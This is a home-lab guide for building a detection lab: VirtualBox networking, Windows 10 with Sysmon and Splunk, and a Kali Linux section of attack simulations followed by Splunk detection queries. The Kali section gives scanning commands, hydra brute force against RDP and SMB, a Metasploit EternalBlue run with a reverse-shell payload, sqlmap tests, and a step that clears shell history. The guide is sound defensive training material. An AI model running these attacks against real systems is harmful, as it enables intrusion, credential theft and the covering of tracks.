## SETUP-GUIDE

### 1.VirtualBox Setup
### 2.Kali Linux Setup
### 3.Windows 10 + Splunk Enterprise Setup





# VirtualBox-Setup.md

```markdown
# VirtualBox Setup Guide

## Prerequisites
- Host machine with at least 8GB RAM (16GB recommended)
- 100GB+ free storage space
- Oracle VirtualBox 6.1 or newer
- VirtualBox Extension Pack

## Installation Steps

### 1. Download and Install VirtualBox

**For Ubuntu/Debian:**
```bash
wget -q https://www.virtualbox.org/download/oracle_vbox_2016.asc -O- | sudo apt-key add -
echo "deb [arch=amd64] http://download.virtualbox.org/virtualbox/debian $(lsb_release -cs) contrib" | sudo tee /etc/apt/sources.list.d/virtualbox.list
sudo apt update
sudo apt install virtualbox-6.1
```

**For Windows:**
- Download from: https://www.virtualbox.org/wiki/Downloads

### 2. Install Extension Pack
- Download from VirtualBox website
- File → Preferences → Extensions → Add package

### 3. Create Host-Only Network

**Command line method:**
```bash
VBoxManage hostonlyif create
VBoxManage hostonlyif ipconfig vboxnet0 --ip 192.168.56.1 --netmask 255.255.255.0
```

**GUI method:**
- File → Preferences → Network → Host-only Networks → Add

### 4. Windows 10 VM Configuration
- **Name**: Win10-Splunk
- **Type**: Microsoft Windows
- **Version**: Windows 10 (64-bit)
- **Memory**: 4096 MB
- **Hard disk**: 40GB dynamically allocated
- **Network**: 
  - Adapter 1: NAT (for internet access)
  - Adapter 2: Host-only Adapter (vboxnet0)

### 5. Kali Linux VM Configuration
- **Name**: Kali-Linux
- **Type**: Linux
- **Version**: Debian (64-bit)
- **Memory**: 4096 MB
- **Hard disk**: 20GB dynamically allocated
- **Network**:
  - Adapter 1: NAT (for internet access)
  - Adapter 2: Host-only Adapter (vboxnet0)

### 6. Installation Media
- Windows 10 ISO: Download from Microsoft website
- Kali Linux ISO: Download from https://www.kali.org/get-kali/

### 7. Guest Additions
Install Guest Additions on both VMs for better integration:

**On Kali Linux:**
```bash
sudo apt update
sudo apt install -y build-essential dkms linux-headers-$(uname -r)
```
Then Devices → Insert Guest Additions CD image

## Verification
- Verify network connectivity between VMs
- Test internet access from both VMs
- Ensure file sharing works between host and guests
```

# Windows10-Splunk-Configuration.md

```markdown
# Windows 10 & Splunk Configuration Guide

## Windows 10 Setup

### 1. Initial Configuration
- Set computer name: WIN10-SPLUNK
- Create local admin account
- Install all Windows updates
- Enable Remote Desktop (optional)

### 2. Security Configuration

**PowerShell Commands:**
```powershell
# Enable Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $false

# Configure Windows Firewall
netsh advfirewall set allprofiles state on

# Enable PowerShell logging
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" /v EnableModuleLogging /t REG_DWORD /d 1 /f
```

### 3. Install Sysmon
Download Sysmon from Microsoft Sysinternals:

**PowerShell Commands:**
```powershell
# Download Sysmon
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "C:\Temp\Sysmon.zip"

# Extract and install with configuration
Expand-Archive -Path "C:\Temp\Sysmon.zip" -DestinationPath "C:\Sysmon"
C:\Sysmon\Sysmon.exe -i -accepteula
```

### 4. Install Splunk Enterprise

#### Download and Install
1. Download Splunk Enterprise from https://www.splunk.com/en_us/download/splunk-enterprise.html
2. Run the installer as administrator
3. Set installation directory: `C:\Splunk`
4. Create admin credentials (remember these!)

#### Initial Configuration

**Command Line:**
```bash
# Start Splunk
cd C:\Splunk\bin
splunk start

# Enable start on boot
splunk enable boot-start
```

- Open Splunk web interface: https://localhost:8000

#### Configure Data Inputs
1. Navigate to Settings → Data inputs
2. Add Windows Event Log inputs:
   - Security
   - System
   - Application
   - PowerShell Operational
3. Add Sysmon data via Monitor → Files & Directories

#### Install Apps and Add-ons
1. Splunk Add-on for Microsoft Windows
2. Splunk App for Enterprise Security (if licensed)
3. Sysmon Add-on

## Verification Tests

**Splunk Search Queries:**
```bash
# Check if Splunk is receiving data
index=* | head 10

# Verify Windows events
index=main sourcetype=WinEventLog | stats count by sourcetype

# Check Sysmon data
index=main sourcetype=sysmon | head 5
```
```

# Kali-Linux-Testing.md

```markdown
# Kali Linux Testing Guide

## Initial Setup

### 1. System Update
```bash
sudo apt update && sudo apt full-upgrade -y
sudo apt install -y kali-linux-default
```

### 2. Network Configuration
```bash
# Set static IP on host-only interface
sudo nano /etc/network/interfaces

# Add:
# auto eth1
# iface eth1 inet static
# address 192.168.56.101
# netmask 255.255.255.0

sudo systemctl restart networking
```

### 3. Install Additional Tools
```bash
# Network scanning tools
sudo apt install -y nmap masscan netdiscover

# Vulnerability scanners
sudo apt install -y nikto skipfish

# Password tools
sudo apt install -y hydra john hashcat

# Web application tools
sudo apt install -y burpsuite sqlmap dirb
```

## Attack Simulation Procedures

### 1. Network Discovery
```bash
# Discover hosts on the network
nmap -sn 192.168.56.0/24

# Identify Windows target
netdiscover -r 192.168.56.0/24

# Detailed scan of Windows target
nmap -sS -sV -O -A 192.168.56.100
```

### 2. Service Enumeration
```bash
# SMB enumeration
enum4linux -a 192.168.56.100

# HTTP service inspection
nikto -h http://192.168.56.100

# Directory brute force
dirb http://192.168.56.100 /usr/share/wordlists/dirb/common.txt
```

### 3. Authentication Attacks
```bash
# RDP brute force (if service detected)
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.56.100

# SMB brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://192.168.56.100
```

### 4. Metasploit Framework Tests
```bash
# Start Metasploit
msfconsole

# Example exploit search
search eternalblue

# Example exploit usage
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.56.100
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.101
exploit
```

### 5. Web Application Tests
```bash
# SQL injection testing
sqlmap -u "http://192.168.56.100/login.php" --forms --batch

# XSS testing with Burp Suite
# 1. Configure browser proxy to 127.0.0.1:8080
# 2. Intercept requests and modify parameters
```

## Detection Validation

After each test, check Splunk for detection:

**Splunk Search Queries:**
```sql
# Failed login attempts
index=main sourcetype=WinEventLog:Security EventCode=4625

# Network connections
index=main sourcetype=sysmon EventID=3

# Process creation
index=main sourcetype=sysmon EventID=1
```

## Cleanup
```bash
# Clear logs and history
msfconsole -x "sessions -K"
history -c
```

## Safety Notes
- Only test against your own lab environment
- Document all tests for future reference
- Never perform these tests against systems you don't own
```

